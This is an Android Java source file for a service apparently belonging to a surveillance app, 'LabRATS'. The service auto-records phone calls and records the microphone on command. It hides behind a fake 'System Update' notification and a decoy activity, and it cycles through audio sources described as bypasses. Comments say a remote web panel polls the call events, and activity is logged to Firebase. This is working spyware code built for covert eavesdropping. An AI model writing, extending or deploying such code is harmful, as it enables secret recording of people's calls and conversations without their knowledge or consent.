package com.labs.labrats;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.pm.ServiceInfo;
import android.media.MediaRecorder;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import java.io.File;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

/**
 * Service for call recording and microphone capture
 */
public class MediaFrameworkService extends Service {

    private static final String TAG = "MediaFrameworkService";
    private static final String CHANNEL_ID = "MediaFrameworkServiceChannel";
    private static final int NOTIFICATION_ID = 3003;

    // Shared preferences keys
    public static final String PREFS_NAME = "StabilityConfig";
    public static final String PREF_AUTO_RECORD_CALLS = "auto_record_calls";
    public static final String PREF_SAVE_ON_DEVICE = "save_on_device";

    // Static instance
    private static MediaFrameworkService instance;

    // MediaRecorder for audio
    private MediaRecorder mediaRecorder;
    private PowerManager.WakeLock wakeLock;

    // Recording state
    private static volatile boolean isRecordingCall = false;
    private static volatile boolean isRecordingMic = false;
    private static String currentRecordingPath = null;
    private static String currentRecordingType = null; // "call" or "mic"
    private static long recordingStartTime = 0;

    // Call info
    private static String currentCallNumber = "";
    private static String currentCallType = ""; // "incoming" or "outgoing"
    private static boolean callInProgress = false;

    // Settings
    private static boolean autoRecordEnabled = true;
    private static boolean saveOnDeviceEnabled = true;
    private static boolean isForeground = false;

    public static MediaFrameworkService getInstance() {
        return instance;
    }

    @Override
    public void onCreate() {
        super.onCreate();
        instance = this;

        createNotificationChannel();
        ensureForeground();

        // Initialize WakeLock
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "LabRATS:CallRecordWakeLock");

        // Load settings
        loadSettings();

        Log.d(TAG, "MediaFrameworkService created");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Always ensure we call startForeground if on Android 8.0+
        // This prevents "ForegroundServiceDidNotStartInTimeException"
        if (!isForeground) {
            ensureForeground();
        }

        try {
            if (intent != null) {
                String action = intent.getAction();

                if (Constants.ACTION_START_CALL_REC.equals(action)) {
                    String phoneNumber = intent.getStringExtra("phone_number");
                    String callType = intent.getStringExtra("call_type"); // incoming/outgoing
                    startCallRecording(phoneNumber, callType);
                } else if (Constants.ACTION_STOP_CALL_REC.equals(action)) {
                    stopCallRecording();
                } else if (Constants.ACTION_START_MIC_REC.equals(action)) {
                    int duration = intent.getIntExtra("duration", 0); // 0 = indefinite
                    startMicRecording(duration);
                } else if (Constants.ACTION_STOP_MIC_REC.equals(action)) {
                    stopMicRecording();
                } else if (Constants.ACTION_CALL_STATE_CHANGED.equals(action)) {
                    int callState = intent.getIntExtra("call_state", 0);
                    String phoneNumber = intent.getStringExtra("phone_number");
                    handleCallStateChange(callState, phoneNumber);
                } else if (Constants.ACTION_UPDATE_AUDIO_SETTINGS.equals(action)) {
                    boolean autoRecord = intent.getBooleanExtra("auto_record", true);
                    boolean saveOnDevice = intent.getBooleanExtra("save_on_device", true);
                    updateSettings(autoRecord, saveOnDevice);
                } else if (Constants.ACTION_STOP_AUDIO.equals(action) || "STOP".equals(action)) {
                    stopMicRecording();
                    stopCallRecording();
                    releaseWakeLock();
                    try {
                        stopForeground(true);
                    } catch (Exception ignored) {}
                    stopSelf();
                } else if (Constants.ACTION_START_AUDIO.equals(action) || "START_SERVICE".equals(action)) {
                    // Just initialization
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error in onStartCommand: " + e.getMessage(), e);
        }

        return START_STICKY;
    }

    private boolean isStealthMode() {
        android.content.ComponentName fakeAlias = new android.content.ComponentName(this, "com.labs.labrats.SystemUpdateAlias");
        return getPackageManager().getComponentEnabledSetting(fakeAlias) == android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED;
    }

    private void ensureForeground() {
        if (isForeground) return;
        
        boolean stealth = isStealthMode();
        Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
        PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                PendingIntent.FLAG_IMMUTABLE);

        Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                .setContentTitle(stealth ? "System Update" : "Audio Monitor")
                .setContentText(stealth ? "Checking for system updates..." : "Monitoring audio...")
                .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.default_app_icon)
                .setContentIntent(pendingIntent)
                .setOngoing(true)
                .setPriority(NotificationCompat.PRIORITY_MIN)
                .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                .build();

        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                // Use most compatible type for background start
                int serviceType = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC;
                try {
                    startForeground(NOTIFICATION_ID, notification, serviceType);
                    isForeground = true;
                } catch (Exception e) {
                    Log.w(TAG, "Standard FGS start failed: " + e.getMessage());
                    startForeground(NOTIFICATION_ID, notification);
                    isForeground = true;
                }
            } else {
                startForeground(NOTIFICATION_ID, notification);
                isForeground = true;
            }
        } catch (Exception e) {
            Log.e(TAG, "Critical FGS failure: " + e.getMessage());
        }
        Log.d(TAG, "MediaFrameworkService ensured in foreground: " + isForeground);
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Audio Stability",
                    NotificationManager.IMPORTANCE_MIN);
            channel.setDescription("Background audio support service");
            channel.setShowBadge(false);

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private void loadSettings() {
        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        autoRecordEnabled = prefs.getBoolean(PREF_AUTO_RECORD_CALLS, true);
        saveOnDeviceEnabled = prefs.getBoolean(PREF_SAVE_ON_DEVICE, true);
        Log.d(TAG, "Settings loaded - AutoRecord: " + autoRecordEnabled + ", SaveOnDevice: " + saveOnDeviceEnabled);
    }

    private void updateSettings(boolean autoRecord, boolean saveOnDevice) {
        autoRecordEnabled = autoRecord;
        saveOnDeviceEnabled = saveOnDevice;

        SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        prefs.edit()
                .putBoolean(PREF_AUTO_RECORD_CALLS, autoRecord)
                .putBoolean(PREF_SAVE_ON_DEVICE, saveOnDevice)
                .apply();

        Log.d(TAG, "Settings updated - AutoRecord: " + autoRecord + ", SaveOnDevice: " + saveOnDevice);
    }

    // Called when phone state changes (from TelephonyState)
    public void handleCallStateChange(int callState, String phoneNumber) {
        Log.d(TAG, "Call state changed: " + callState + ", number: " + phoneNumber);

        switch (callState) {
            case 1: // RINGING (incoming call)
                currentCallNumber = phoneNumber != null ? phoneNumber : "Unknown";
                currentCallType = "incoming";
                callInProgress = true;
                notifyCallIncoming(phoneNumber);
                break;

            case 2: // OFFHOOK (call answered or outgoing call)
                if (!callInProgress) {
                    // Outgoing call
                    currentCallNumber = phoneNumber != null ? phoneNumber : "Unknown";
                    currentCallType = "outgoing";
                    callInProgress = true;
                    notifyCallOutgoing(phoneNumber);
                    if (autoRecordEnabled && !isRecordingCall) {
                        startCallRecording(phoneNumber, "outgoing");
                    }
                } else if ("incoming".equals(currentCallType)) {
                    // Incoming call answered
                    if (autoRecordEnabled && !isRecordingCall) {
                        startCallRecording(currentCallNumber, "incoming");
                    }
                }
                break;

            case 0: // IDLE (call ended)
                callInProgress = false;

                // Stop recording if in progress
                if (isRecordingCall) {
                    stopCallRecording();
                }

                notifyCallEnded();

                currentCallNumber = "";
                currentCallType = "";
                break;
        }
    }

    private void notifyCallIncoming(String phoneNumber) {
        // This will be polled by web panel
        Log.d(TAG, "Incoming call notification: " + phoneNumber);
    }

    private void notifyCallOutgoing(String phoneNumber) {
        Log.d(TAG, "Outgoing call notification: " + phoneNumber);
    }

    private void notifyCallEnded() {
        Log.d(TAG, "Call ended notification");
    }

    private MediaRecorder createMediaRecorder() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            return new MediaRecorder(this);
        } else {
            return new MediaRecorder();
        }
    }

    // ============ CALL RECORDING ============

    public void startCallRecording(String phoneNumber, String callType) {
        if (isRecordingCall || isRecordingMic) {
            Log.w(TAG, "Already recording something");
            return;
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "RECORD_AUDIO permission not granted");
            return;
        }

        try {
            acquireWakeLock();

            // Create directory
            File recordDir = getRecordingsDirectory();
            if (!recordDir.exists()) {
                recordDir.mkdirs();
            }

            // Create filename
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String safeNumber = (phoneNumber != null ? phoneNumber : "unknown").replaceAll("[^0-9+]", "");
            String fileName = "CALL_" + callType + "_" + safeNumber + "_" + timestamp + ".m4a";

            File recordFile = new File(recordDir, fileName);
            currentRecordingPath = recordFile.getAbsolutePath();
            currentRecordingType = "call";

            // Setup MediaRecorder
            mediaRecorder = createMediaRecorder();

            // Tactical Source Probing: Try sources in order of bypass reliability
            int[] sources = {
                MediaRecorder.AudioSource.VOICE_RECOGNITION, // High priority bypass
                MediaRecorder.AudioSource.VOICE_COMMUNICATION, // VoIP/Speaker bypass
                MediaRecorder.AudioSource.MIC, // Standard fallback
                MediaRecorder.AudioSource.CAMCORDER // Hardware-level fallback
            };

            boolean started = false;
            String errorLogs = "";

            for (int source : sources) {
                try {
                    mediaRecorder.reset();
                    mediaRecorder.setAudioSource(source);
                    mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
                    mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
                    mediaRecorder.setAudioEncodingBitRate(128000);
                    mediaRecorder.setAudioSamplingRate(44100);
                    mediaRecorder.setOutputFile(currentRecordingPath);
                    mediaRecorder.prepare();
                    mediaRecorder.start();
                    started = true;
                    Log.d(TAG, "Call recording started with source: " + source);
                    FirebaseConfig.logActivity("CALL_RECORD: Uplink established using source_id_" + source);
                    break;
                } catch (Exception e) {
                    errorLogs += source + ":" + e.getMessage() + "; ";
                    Log.w(TAG, "Source " + source + " blocked: " + e.getMessage());
                }
            }

            if (!started) {
                throw new Exception("ALL_SOURCES_BLOCKED: " + errorLogs);
            }

            isRecordingCall = true;
            recordingStartTime = System.currentTimeMillis();
            currentCallNumber = phoneNumber;
            currentCallType = callType;

            updateNotification("Recording " + callType + " call: " + phoneNumber);
            Log.d(TAG, "Call recording started successfully: " + currentRecordingPath);

        } catch (Exception e) {
            Log.e(TAG, "FAILED to start call recording: " + e.getMessage());
            isRecordingCall = false;
            releaseMediaRecorder();
            // Cleanup empty file
            if (currentRecordingPath != null) {
                try {
                    new File(currentRecordingPath).delete();
                } catch (Exception ignored) {}
            }
        }
    }

    public void stopCallRecording() {
        if (!isRecordingCall) {
            return;
        }

        Log.d(TAG, "Stopping call recording");
        isRecordingCall = false;

        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping MediaRecorder", e);
        }

        releaseMediaRecorder();
        releaseWakeLock();

        long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
        Log.d(TAG, "Call recording stopped. Duration: " + duration + "s, Path: " + currentRecordingPath);

        updateNotification("Monitoring audio...");
    }

    // ============ MICROPHONE RECORDING ============

    public void startMicRecording(int durationSeconds) {
        if (isRecordingCall || isRecordingMic) {
            Log.w(TAG, "Already recording something");
            return;
        }

        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "RECORD_AUDIO permission not granted");
            return;
        }

        try {
            acquireWakeLock();

            // Create directory
            File recordDir = getRecordingsDirectory();
            if (!recordDir.exists()) {
                recordDir.mkdirs();
            }

            // Create filename
            String timestamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
            String fileName = "MIC_" + timestamp + ".m4a";

            File recordFile = new File(recordDir, fileName);
            currentRecordingPath = recordFile.getAbsolutePath();
            currentRecordingType = "mic";

            // Setup MediaRecorder
            mediaRecorder = createMediaRecorder();
            mediaRecorder.setAudioSource(MediaRecorder.AudioSource.MIC);
            mediaRecorder.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4);
            mediaRecorder.setAudioEncoder(MediaRecorder.AudioEncoder.AAC);
            mediaRecorder.setAudioEncodingBitRate(128000);
            mediaRecorder.setAudioSamplingRate(44100);
            mediaRecorder.setOutputFile(currentRecordingPath);

            // Set max duration if specified
            if (durationSeconds > 0) {
                mediaRecorder.setMaxDuration(durationSeconds * 1000);
                mediaRecorder.setOnInfoListener((mr, what, extra) -> {
                    if (what == MediaRecorder.MEDIA_RECORDER_INFO_MAX_DURATION_REACHED) {
                        stopMicRecording();
                    }
                });
            }

            mediaRecorder.prepare();
            mediaRecorder.start();

            isRecordingMic = true;
            recordingStartTime = System.currentTimeMillis();

            String durationText = durationSeconds > 0 ? " (max " + durationSeconds + "s)" : "";
            updateNotification("Recording microphone" + durationText);

            Log.d(TAG, "Microphone recording started successfully: " + currentRecordingPath);

        } catch (Exception e) {
            Log.e(TAG, "FAILED to start microphone recording: " + e.getMessage());
            isRecordingMic = false;
            releaseMediaRecorder();
            if (currentRecordingPath != null) {
                try {
                    new File(currentRecordingPath).delete();
                } catch (Exception ignored) {}
            }
        }
    }

    public void stopMicRecording() {
        if (!isRecordingMic) {
            return;
        }

        Log.d(TAG, "Stopping microphone recording");
        isRecordingMic = false;

        try {
            if (mediaRecorder != null) {
                mediaRecorder.stop();
            }
        } catch (Exception e) {
            Log.e(TAG, "Error stopping MediaRecorder", e);
        }

        releaseMediaRecorder();
        releaseWakeLock();

        long duration = (System.currentTimeMillis() - recordingStartTime) / 1000;
        Log.d(TAG, "Microphone recording stopped. Duration: " + duration + "s, Path: " + currentRecordingPath);

        updateNotification("Monitoring audio...");
    }

    private void releaseMediaRecorder() {
        if (mediaRecorder != null) {
            try {
                mediaRecorder.reset();
                mediaRecorder.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing MediaRecorder", e);
            }
            mediaRecorder = null;
        }
    }

    private void acquireWakeLock() {
        if (wakeLock != null && !wakeLock.isHeld()) {
            wakeLock.acquire(60 * 60 * 1000L); // 1 hour max
            Log.d(TAG, "WakeLock acquired");
        }
    }

    private void releaseWakeLock() {
        if (wakeLock != null && wakeLock.isHeld()) {
            wakeLock.release();
            Log.d(TAG, "WakeLock released");
        }
    }

    private void updateNotification(String text) {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            boolean stealth = isStealthMode();
            Intent notificationIntent = new Intent(this, stealth ? DecoyActivity.class : MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(this, 0, notificationIntent,
                    PendingIntent.FLAG_IMMUTABLE);

            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setContentTitle(stealth ? "System Update" : "Audio Monitor")
                    .setContentText(stealth ? "Checking for system updates..." : text)
                    .setSmallIcon(stealth ? R.drawable.ic_sprocket_gear : R.drawable.default_app_icon)
                    .setContentIntent(pendingIntent)
                    .setOngoing(true)
                    .setPriority(NotificationCompat.PRIORITY_LOW)
                    .build();

            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.notify(NOTIFICATION_ID, notification);
            }
        }
    }

    private File getRecordingsDirectory() {
        if (saveOnDeviceEnabled) {
            return new File(Environment.getExternalStoragePublicDirectory(
                    Environment.DIRECTORY_MUSIC), "LabRATSRecordings");
        } else {
            return new File(getFilesDir(), "recordings");
        }
    }

    // ============ STATIC ACCESSORS ============

    public static boolean isRecordingCall() {
        return isRecordingCall;
    }

    public static boolean isRecordingMic() {
        return isRecordingMic;
    }

    public static boolean isRecording() {
        return isRecordingCall || isRecordingMic;
    }

    public static String getCurrentRecordingPath() {
        return currentRecordingPath;
    }

    public static String getCurrentRecordingType() {
        return currentRecordingType;
    }

    public static long getRecordingDuration() {
        if ((isRecordingCall || isRecordingMic) && recordingStartTime > 0) {
            return (System.currentTimeMillis() - recordingStartTime) / 1000;
        }
        return 0;
    }

    public static String getCurrentCallNumber() {
        return currentCallNumber;
    }

    public static String getCurrentCallType() {
        return currentCallType;
    }

    public static boolean isCallInProgress() {
        return callInProgress;
    }

    public static boolean isAutoRecordEnabled() {
        return autoRecordEnabled;
    }

    public static boolean isSaveOnDeviceEnabled() {
        return saveOnDeviceEnabled;
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "MediaFrameworkService onDestroy");
        isForeground = false; // CRITICAL: Reset state so next start calls startForeground()

        if (isRecordingCall) {
            stopCallRecording();
        }
        if (isRecordingMic) {
            stopMicRecording();
        }

        releaseMediaRecorder();
        releaseWakeLock();
        instance = null;
    }
}
